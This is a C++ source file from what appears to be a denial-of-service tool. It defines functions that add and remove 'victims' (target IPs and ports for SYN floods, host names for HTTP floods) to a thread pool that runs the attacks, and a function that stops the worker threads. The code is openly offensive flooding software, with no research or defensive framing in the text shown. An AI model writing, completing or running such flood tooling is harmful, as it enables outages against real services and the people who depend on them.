#include "victim_manipulation.h"


void victims::add_tcp_victim(const char* iph_destip, const char* tcph_destport)
{
    src_dst ports_ips{};
    ports_ips.source_ip = source_ip;
    ports_ips.source_port = source_port;
    ports_ips.dest_ip = inet_addr(iph_destip);
    ports_ips.dest_port = stoi(std::string(tcph_destport));
    ports_ips.flood_type = SYN_FLOOD;
    ports_ips.host_name = "tcp";
    pool.enqueue(ports_ips);
}

void victims::add_http_victim(const char* host_name)
{
    src_dst ports_ips{};
    ports_ips.source_ip = source_ip;
    ports_ips.source_port = source_port;
    ports_ips.flood_type = HTTP_FLOOD;
    ports_ips.host_name = host_name;
    pool.enqueue(ports_ips);
}

void victims::remove_tcp_victim(const char* dest_ip, const char* dest_port)
{
    src_dst to_remove{};
    to_remove.source_ip = source_ip;
    to_remove.source_port = source_port;
    to_remove.dest_ip = inet_addr(dest_ip);
    to_remove.dest_port = stoi(std::string(dest_port));
    pool.remove_victim(to_remove);
}

void victims::remove_http_victim(const char* host_name)
{
    src_dst to_remove{};
    to_remove.source_ip = source_ip;
    to_remove.source_port = source_port;
    to_remove.host_name = host_name;
    pool.remove_victim(to_remove);
}

void victims::clear_thread_pool(int threads)
{
    for (int thread = 0; thread < threads; thread++)
    {
        pool.insert_pill(thread);
    }
}